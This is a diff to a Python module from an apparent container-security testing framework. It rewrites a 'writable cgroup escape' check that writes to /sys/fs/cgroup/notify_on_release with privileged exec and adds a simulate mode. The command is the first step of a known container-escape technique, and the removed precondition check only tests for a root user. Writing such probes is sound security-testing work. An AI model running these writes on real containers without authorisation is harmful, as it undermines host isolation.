@@ -1,28 +1,24 @@
-# attacks/cgroup_writable_escape.py
+# attacks/writable_cgroup_escape.py
 
-def is_vulnerable(env_info):
-    """
-    Check if /sys/fs/cgroup is writable inside the container.
-    This is a basic precondition for classic cgroup notify_on_release escapes.
-    """
-    try:
-        test_path = "/sys/fs/cgroup/test_notify_escape"
-        return env_info.get("container_user", "") == "root"
-    except Exception:
-        return False
+def run(container, simulate=False):
+    print("[*] Running Writable Cgroup Escape...")
 
-def run(container):
-    """
-    Simulate a writable cgroup-based container escape.
-    This PoC just writes to a cgroup config file to demonstrate write access.
-    """
-    print("[WritableCgroup] Attempting to write to /sys/fs/cgroup/notify_on_release")
+    if simulate:
+        # Simulated execution: no file system modifications
+        print(f"[SIMULATE] Would attempt to write to /sys/fs/cgroup/ in container '{container.name}'")
+        return "Simulated run: No cgroup modification performed."
 
     try:
-        result = container.exec_run("echo 1 > /sys/fs/cgroup/notify_on_release")
-        if result.exit_code == 0:
-            return "Write to cgroup config successful (potentially exploitable)"
-        else:
-            return "Write failed or cgroup is read-only"
+        # ⚠️ WARNING: Writable Cgroup Escape
+        # This exploit abuses writable cgroup paths inside the container to escape or influence host cgroup management.
+        # If successful, it could allow process spoofing, OOM manipulation, or interaction with host-level controls.
+        # Note: Behavior varies by kernel/cgroup version and Docker runtime configuration.
+
+        command = "echo 1 > /sys/fs/cgroup/notify_on_release"
+        exec_result = container.exec_run(command, privileged=True)
+        print(f"[+] Command attempted: {command}")
+        return f"Executed: {command}"
+
     except Exception as e:
-        return f"Exception occurred during write: {str(e)}"
+        print(f"[!] Exploit failed: {e}")
+        return f"Failed: {str(e)}"
